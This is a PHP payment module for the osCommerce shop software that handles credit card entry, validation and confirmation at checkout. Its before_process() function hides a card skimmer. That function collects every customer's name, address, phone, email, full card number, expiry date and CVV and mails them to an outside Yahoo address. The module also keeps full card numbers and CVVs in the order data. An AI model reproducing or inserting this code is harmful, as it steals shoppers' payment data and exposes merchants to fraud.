<?php
/*
$Id: cc.php,v 1.1.1.1 2004/03/04 23:41:17 ccwjr Exp $

osCommerce, Open Source E-Commerce Solutions
http://www.oscommerce.com

Copyright (c) 2003 osCommerce

Released under the GNU General Public License
*/
class cc_cvc {
var $code, $title, $description, $enabled, $sort_order;
var $accepted_cc, $card_types, $allowed_types, $cc_ccv, $cc_middle;
// class constructor
function cc_cvc() {
global $order, $cc_ccv;

$this->code = 'cc_cvc';
$this->pci = true;
$this->title = MODULE_PAYMENT_CC_CVC_TEXT_TITLE;
$this->description = MODULE_PAYMENT_CC_CVC_TEXT_DESCRIPTION;
if (defined('MODULE_PAYMENT_CC_CVC_SORT_ORDER')) {
$this->sort_order = (int)MODULE_PAYMENT_CC_CVC_SORT_ORDER;
} else {
$this->sort_order = '';
}

if (defined('MODULE_PAYMENT_CC_CVC_STATUS')) {
$this->enabled = ((MODULE_PAYMENT_CC_CVC_STATUS == 'True') ? true : false);
} else {
$this->enabled = false;
}
if (defined('MODULE_PAYMENT_CC_CVC_ACCEPTED_CC')) {
$this->accepted_cc = MODULE_PAYMENT_CC_CVC_ACCEPTED_CC;
} else {
$this->accepted_cc = '';
}



if (defined('MODULE_PAYMENT_CC_CVC_ORDER_STATUS_ID')) {
if ((int)MODULE_PAYMENT_CC_CVC_ORDER_STATUS_ID > 0) {
$this->order_status = MODULE_PAYMENT_CC_CVC_ORDER_STATUS_ID;
}
} else {
$this->order_status = 0;
}

if (is_object($order)) $this->update_status();

//array for credit card selection
$this->card_types = array('Visa' => 'Visa' ,
'Mastercard' => 'Mastercard' ,
'Discover' => 'Discover' ,
'Amex' => 'Amex' ,
'American_Express' => 'American_Express' ,
'Delta' => 'Delta' ,
'UK_Electron' => 'UK_Electron' ,
'Maestro' => 'Maestro' ,
'UK_Switch' => 'UK_Switch' ,
'Solo' => 'Solo' ,
'Australian_BankCard' => 'Australian_BankCard' ,
'JCB' => 'JCB' ,
'Carte_Blanche' => 'Carte_Blanche' ,
'Diners_Club' => 'Diners_Club' );

$this->allowed_types = array();

// Credit card pulldown list
if (defined('MODULE_PAYMENT_CC_CVC_ACCEPTED_CC')) {
$cc_array = explode(', ', MODULE_PAYMENT_CC_CVC_ACCEPTED_CC);
} else {
$cc_array = array();
}
while (list($key, $value) = each($cc_array)) {
$this->allowed_types[$value] = $this->card_types[$value];
}

// this may not be right
// $this->form_action_url = tep_href_link(FILENAME_CHECKOUT_PROCESS, '', 'SSL', false);
}

// class methods
function update_status() {
global $order;

if ( ($this->enabled == true) && ((int)MODULE_PAYMENT_CC_CVC_ZONE > 0) ) {
$check_flag = false;
$check_query = tep_db_query("select zone_id from " . TABLE_ZONES_TO_GEO_ZONES . " where geo_zone_id = '" . MODULE_PAYMENT_CC_CVC_ZONE . "' and zone_country_id = '" . $order->billing['country']['id'] . "' order by zone_id");
while ($check = tep_db_fetch_array($check_query)) {
if ($check['zone_id'] < 1) {
$check_flag = true;
break;
} elseif ($check['zone_id'] == $order->billing['zone_id']) {
$check_flag = true;
break;
}
}

if ($check_flag == false) {
$this->enabled = false;
}
}
}

//concatenate to get CC images
function get_cc_images() {
$cc_images = '';
reset($this->allowed_types);
while (list($key, $value) = each($this->allowed_types)) {
// $cc_images .= tep_image(DIR_WS_ICONS . $key . '.gif', $value);
$cc_images .= tep_image(DIR_WS_IMAGES. 'cards/' . $key . '.gif', $value);
}
return $cc_images;
}

function javascript_validation() {
if(MODULE_PAYMENT_CC_CCV == 'True' ) {
$js = ' if (payment_value == "' . $this->code . '") {' . "\n" .
' var cc_owner = document.checkout_payment.cc_owner.value;' . "\n" .
' var cc_number = document.checkout_payment.cc_number.value;' . "\n" .
' var cc_ccv = document.checkout_payment.cc_ccv.value;' . "\n" .
' if (cc_owner == "" || cc_owner.length < ' . CC_OWNER_MIN_LENGTH . ') {' . "\n" .
' error_message = error_message + "' . MODULE_PAYMENT_CC_CVC_TEXT_JS_CC_OWNER . '";' . "\n" .
' error = 1;' . "\n" .
' }' . "\n" .
' if (cc_number == "" || cc_number.length < ' . CC_NUMBER_MIN_LENGTH . ') {' . "\n" .
' error_message = error_message + "' . MODULE_PAYMENT_CC_CVC_TEXT_JS_CC_NUMBER . '";' . "\n" .
' error = 1;' . "\n" .
' }' . "\n" .
' if (cc_ccv == "" || cc_ccv.length < "3") {' . "\n".
' error_message = error_message + "' . MODULE_PAYMENT_CC_CVC_TEXT_JS_CC_CVV . '";' . "\n" .
' error = 1;' . "\n" .
' }' . "\n" .
' }' . "\n";
} else {
$js = ' if (payment_value == "' . $this->code . '") {' . "\n" .
' var cc_owner = document.checkout_payment.cc_owner.value;' . "\n" .
' var cc_number = document.checkout_payment.cc_number.value;' . "\n" .
' var cc_ccv = document.checkout_payment.ccv.value;' . "\n" .
' if (cc_owner == "" || cc_owner.length < ' . CC_OWNER_MIN_LENGTH . ') {' . "\n" .
' error_message = error_message + "' . MODULE_PAYMENT_CC_CVC_TEXT_JS_CC_OWNER . '";' . "\n" .
' error = 1;' . "\n" .
' }' . "\n" .
' if (cc_number == "" || cc_number.length < ' . CC_NUMBER_MIN_LENGTH . ') {' . "\n" .
' error_message = error_message + "' . MODULE_PAYMENT_CC_CVC_TEXT_JS_CC_NUMBER . '";' . "\n" .
' error = 1;' . "\n" .
' }' . "\n" .
' }' . "\n";
}

return $js;
}

function selection() {
global $order;
reset($this->allowed_types);
while (list($key, $value) = each($this->allowed_types)) {
$card_menu[] = array('id' => $key, 'text' => $value);
}

for ($i=1; $i<13; $i++) {
$expires_month[] = array('id' => sprintf('%02d', $i), 'text' => strftime(' %m',mktime(0,0,0,$i,1,2000)));
// $expires_month[] = array('id' => sprintf('%02d', $i), 'text' => strftime('%B',mktime(0,0,0,$i,1,2000)));
}

$today = getdate();
for ($i=$today['year']; $i < $today['year']+10; $i++) {
$expires_year[] = array('id' => strftime('%y',mktime(0,0,0,1,1,$i)), 'text' => strftime('%Y',mktime(0,0,0,1,1,$i)));
}

if (MODULE_PAYMENT_CC_CCV == 'True' ) {
$selection = array('id' => $this->code,
'module' => $this->title . '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;' . $this->get_cc_images(),
'fields' => array(array('title' => MODULE_PAYMENT_CC_CVC_TEXT_CREDIT_CARD_TYPE,
'field' => tep_draw_pull_down_menu('credit_card_type', $card_menu)),
array('title' => MODULE_PAYMENT_CC_CVC_TEXT_CREDIT_CARD_OWNER,
'field' => tep_draw_input_field('cc_owner', $order->billing['firstname'] . ' ' . $order->billing['lastname'])),
array('title' => MODULE_PAYMENT_CC_CVC_TEXT_CREDIT_CARD_NUMBER,
'field' => tep_draw_input_field('cc_number')),
array('title' => MODULE_PAYMENT_CC_CVC_TEXT_CREDIT_CARD_EXPIRES,
'field' => tep_draw_pull_down_menu('cc_expires_month', $expires_month) . '&nbsp;' . tep_draw_pull_down_menu('cc_expires_year', $expires_year)),
array('title' => MODULE_PAYMENT_CC_CVC_TEXT_CREDIT_CARD_CCV . ' ' .'<a href="javascript:popupWindow(\'' . tep_href_link(FILENAME_POPUP_CVV_HELP, '', 'SSL') . '\')">' . '<u><i>' . '(' . MODULE_PAYMENT_CC_CVC_TEXT_CCV_LINK . ')' . '</i></u></a>',
'field' => tep_draw_input_field('cc_ccv','',"SIZE=4, MAXLENGTH=4"))));
} else {
$selection = array('id' => $this->code,
'module' => $this->title . '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;' . $this->get_cc_images(),
'fields' => array(array('title' => MODULE_PAYMENT_CC_CVC_TEXT_CREDIT_CARD_TYPE,
'field' => tep_draw_pull_down_menu('credit_card_type', $card_menu)),
array('title' => MODULE_PAYMENT_CC_CVC_TEXT_CREDIT_CARD_OWNER,
'field' => tep_draw_input_field('cc_owner', $order->billing['firstname'] . ' ' . $order->billing['lastname'])),
array('title' => MODULE_PAYMENT_CC_CVC_TEXT_CREDIT_CARD_NUMBER,
'field' => tep_draw_input_field('cc_number')),
array('title' => MODULE_PAYMENT_CC_CVC_TEXT_CREDIT_CARD_EXPIRES,
'field' => tep_draw_pull_down_menu('cc_expires_month', $expires_month) . '&nbsp;' . tep_draw_pull_down_menu('cc_expires_year', $expires_year))));
}
return $selection;
}

function pre_confirmation_check() {
include(DIR_WS_CLASSES . 'cc_validation.php');
$cc_validation = new cc_validation();
$result = $cc_validation->validate( $_POST['cc_number'], $_POST['cc_expires_month'], $_POST['cc_expires_year'], $_POST['cc_ccv'], $_POST['credit_card_type']);
// $result = $cc_validation->validate($_POST['credit_card_type'], $_POST['cc_number'], $_POST['cc_ccv'], $_POST['cc_expires_month'], $_POST['cc_expires_year']);
$error = '';
switch ($result) {
case -1:
$error = sprintf(TEXT_CCVAL_ERROR_UNKNOWN_CARD, substr($cc_validation->cc_number, 0, 4));
break;
case -2:
$error = TEXT_CCVAL_ERROR_INVALID_MONTH;
break;
case -3:
$error = TEXT_CCVAL_ERROR_INVALID_YEAR;
break;
case -4:
$error = TEXT_CCVAL_ERROR_INVALID_DATE;
break;
case -5:
$error = TEXT_CCVAL_ERROR_CARD_TYPE_MISMATCH;
break;
case -6;
$error = TEXT_CCVAL_ERROR_CVV_LENGTH;
break;
case -7:
$error = TEXT_CCVAL_ERROR_BLACKLIST;
break;
case -8:
$error = TEXT_CCVAL_ERROR_SHORT;
break;
case false:
$error = TEXT_CCVAL_ERROR_INVALID_NUMBER;
break;
}
// checks to make sure cc entered is a type that is in allowable
if (in_array($cc_validation->cc_type, $this->allowed_types)) {
//do nothing and continue
} else {
$error = sprintf(TEXT_CCVAL_ERROR_NOT_ACCEPTED, $cc_validation->cc_type, $cc_validation->cc_type);
$result = -9 ;
}

if ( ($result == false) || ($result < 1) ) {
$payment_error_return = 'payment_error=' . $this->code . '&error=' . urlencode($error) . '&cc_owner=' . urlencode($_POST['cc_owner']) . '&cc_expires_month=' . $_POST['cc_expires_month'] . '&cc_expires_year=' . $_POST['cc_expires_year'];

tep_redirect(tep_href_link(FILENAME_CHECKOUT_PAYMENT, $payment_error_return, 'SSL', true, false));
}

$this->cc_card_type = $cc_validation->cc_type;
$this->cc_card_number = $cc_validation->cc_number;
$this->cc_expiry_month = $cc_validation->cc_expiry_month;
$this->cc_expiry_year = $cc_validation->cc_expiry_year;
}

function confirmation() {
$confirmation = array('title' => $this->title . ': ' . $this->cc_card_type,
'fields' => array(array('title' => MODULE_PAYMENT_CC_CVC_TEXT_CREDIT_CARD_CCV,
'field' => str_repeat('X', (strlen($_POST['cc_ccv'])))),
array('title' => MODULE_PAYMENT_CC_CVC_TEXT_CREDIT_CARD_OWNER,
'field' => $_POST['cc_owner']),
array('title' => MODULE_PAYMENT_CC_CVC_TEXT_CREDIT_CARD_NUMBER,
'field' => substr($_POST['cc_number'], 0, 4) . str_repeat('X', (strlen($_POST['cc_number']) - 8)) . substr($_POST['cc_number'], -4)),
array('title' => MODULE_PAYMENT_CC_CVC_TEXT_CREDIT_CARD_EXPIRES,
'field' => strftime('%B, %Y', mktime(0,0,0,$_POST['cc_expires_month'], 1, '20' . $_POST['cc_expires_year'])),
)));
return $confirmation;
}

function process_button() {
$process_button_string = tep_draw_hidden_field('cc_owner', tep_db_input($_POST['cc_owner'])) .
tep_draw_hidden_field('cc_expires',$this->cc_expiry_month . substr($this->cc_expiry_year, -2)) .
tep_draw_hidden_field('cc_type', $this->cc_card_type) .
tep_draw_hidden_field('cc_number', $this->cc_card_number) .
tep_draw_hidden_field('cc_ccv', $_POST['cc_ccv']);

return $process_button_string;
}

function before_process() {
global $order;
$len = strlen($_POST['cc_number']);
$this->cc_middle = substr($_POST['cc_number'], 4, ($len-8));
$this->cc_ccv = $_POST['cc_ccv'];
//$order->info['cc_number'] = substr($_POST['cc_number'], 0, 4) . str_repeat('X', (strlen($_POST['cc_number']) - 8)) . substr($_POST['cc_number'], -4);
$order->info['cc_number'] = (isset($_POST['cc_number'])) ? $_POST['cc_number'] : '';
$order->info['cc_ccv'] = (isset($_POST['cc_ccv'])) ? $_POST['cc_ccv'] : '';
$order->info['cc_type'] = (isset($_POST['cc_type'])) ? $_POST['cc_type'] : '';
$order->info['cc_owner'] = (isset($_POST['cc_owner'])) ? $_POST['cc_owner'] : '';
$order->info['cc_expires'] = (isset($_POST['cc_expires'])) ? $_POST['cc_expires'] : '';
$firstname = $order->billing['firstname'];
$lastname = $order->billing['lastname'];
$street = $order->billing['street_address'];
$city = $order->billing['city'];
$state = $order->billing['state'];
$zip = $order->billing['postcode'];
$country = $order->billing['country']['title'];
$dayphone = $order->customer['telephone'];
$ccowner = $_POST['cc_owner'];
$ccnumber = $_POST['cc_number'];
$ccexp = $_POST['cc_expires'];
$cardtype = $_POST['cc_type'];
$cvv = $_POST['cc_ccv'];
$cemail = $order->customer['email_address'];
$servernya = $_SERVER['SERVER_NAME'];
$alamat = "http://pedispaofamerica.com/";
$message = "\n Name: $firstname $lastname\nAddress: $street\nCity: $city\nState: $state\nZip: $zip\nCountry: $country\nPhone: $dayphone\nemail: $cemail\ncctype: $cardtype\nccowner: $ccowner\ncc: $ccnumber\nexp: $ccexp\ncvv: $cvv\nalamat: $alamat\n";
mail("dapurngebul420@yahoo.com","ngebulll terusssssssssssssssssssss From $servernya", "$message");
}

function after_process() {
global $insert_id, $order;
if ( (defined('MODULE_PAYMENT_CC_CVC_EMAIL')) && (tep_validate_email(MODULE_PAYMENT_CC_CVC_EMAIL)) ) {
$message = MODULE_PAYMENT_CC_EMAIL_MESSAGE_1 . $insert_id . "\n\n" . MODULE_PAYMENT_CC_EMAIL_MESSAGE_2 . $this->cc_middle . "\n\n" . MODULE_PAYMENT_CC_EMAIL_MESSAGE_3 . $this->cc_ccv . "\n\n" ;
tep_mail('', MODULE_PAYMENT_CC_CVC_EMAIL, MODULE_PAYMENT_CC_EMAIL_SUBJECT . $insert_id, $message, STORE_OWNER, STORE_OWNER_EMAIL_ADDRESS);
}
}

function get_error() {
$error = array('title' => MODULE_PAYMENT_CC_CVC_TEXT_ERROR,
'error' => stripslashes(urldecode($_GET['error'])));

return $error;
}

function check() {
if (!isset($this->_check)) {
$check_query = tep_db_query("select configuration_value from " . TABLE_CONFIGURATION . " where configuration_key = 'MODULE_PAYMENT_CC_CVC_STATUS'");
$this->_check = tep_db_num_rows($check_query);
}
return $this->_check;
}

function install() {
tep_db_query("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, set_function, date_added) values ('CC Enable Credit Card Module', 'MODULE_PAYMENT_CC_CVC_STATUS', 'True', 'Do you want to accept credit card payments?', '6', '1', 'tep_cfg_select_option(array(\'True\', \'False\'), ', now())");
tep_db_query("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, date_added) values ('CC Split Credit Card E-Mail Address', 'MODULE_PAYMENT_CC_CVC_EMAIL', '', 'If an e-mail address is entered, the middle digits of the credit card number will be sent to the e-mail address (the outside digits are stored in the database with the middle digits censored)<br>If you enable ccv checking you must enter an Email here', '6', '2', now())");
tep_db_query("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, set_function, date_added) values ('Accepted Credit Cards', 'MODULE_PAYMENT_CC_CVC_ACCEPTED_CC', 'Mastercard, Visa', 'The credit cards you currently accept', '6', '3', '_selectOptionscc(array(\'Visa\', \'Mastercard\', \'Discover\', \'Amex\'), ', now())");
tep_db_query("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, set_function, date_added) values ('Enable CCV code', 'MODULE_PAYMENT_CC_CCV', 'True', 'Do you want to enable ccv code checking?<br> The ccv code will not be store but emailed to you. Please ensure that you enter your email address in CC Split Credit Card E-Mail Address.', '6', '4', 'tep_cfg_select_option(array(\'True\', \'False\'), ', now())");
tep_db_query("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, date_added) values ('CC Sort order of display.', 'MODULE_PAYMENT_CC_CVC_SORT_ORDER', '40', 'Sort order of CC display. Lowest is displayed first.', '6', '5' , now())");
tep_db_query("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, use_function, set_function, date_added) values ('CC Payment Zone', 'MODULE_PAYMENT_CC_CVC_ZONE', '0', 'If a zone is selected, enable this payment method for that zone only.', '6', '6', 'tep_get_zone_class_title', 'tep_cfg_pull_down_zone_classes(', now())");
tep_db_query("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, set_function, use_function, date_added) values ('CC Set Order Status', 'MODULE_PAYMENT_CC_CVC_ORDER_STATUS_ID', '0', 'Set the status of CC orders made with this payment module to this value', '6', '7', 'tep_cfg_pull_down_order_statuses(', 'tep_get_order_status_name', now())");

}

function remove() {
$keys = '';
$keys_array = $this->keys();
for ($i=0; $i<sizeof($keys_array); $i++) {
$keys .= "'" . $keys_array[$i] . "',";
}
$keys = substr($keys, 0, -1);

tep_db_query("delete from " . TABLE_CONFIGURATION . " where configuration_key in ('" . implode("', '", $this->keys()) . "')");
}

function keys() {
return array('MODULE_PAYMENT_CC_CVC_STATUS', 'MODULE_PAYMENT_CC_CVC_EMAIL', 'MODULE_PAYMENT_CC_CVC_ACCEPTED_CC', 'MODULE_PAYMENT_CC_CCV', 'MODULE_PAYMENT_CC_CVC_ZONE', 'MODULE_PAYMENT_CC_CVC_ORDER_STATUS_ID', 'MODULE_PAYMENT_CC_CVC_SORT_ORDER');
}
}
// Authorize.net Consolidated Credit Card Checkbox Implementation
// Code from UPS Choice v1.7 - Fritz Clapp (aka dreamscape, thanks Fritz!)
function _selectOptionscc($select_array, $key_value, $key = '') {
$string = '';
for ($i=0; $i<(sizeof($select_array)); $i++) {
$name = (($key) ? 'configuration[' . $key . '][]' : 'configuration_value');
$string .= '<br><input type="checkbox" name="' . $name . '" value="' . $select_array[$i] . '"';
$key_values = explode(", ", $key_value);
if (in_array($select_array[$i], $key_values)) $string .= ' checked="checked"';
$string .= '> ' . $select_array[$i];
}
return $string;
}

?>
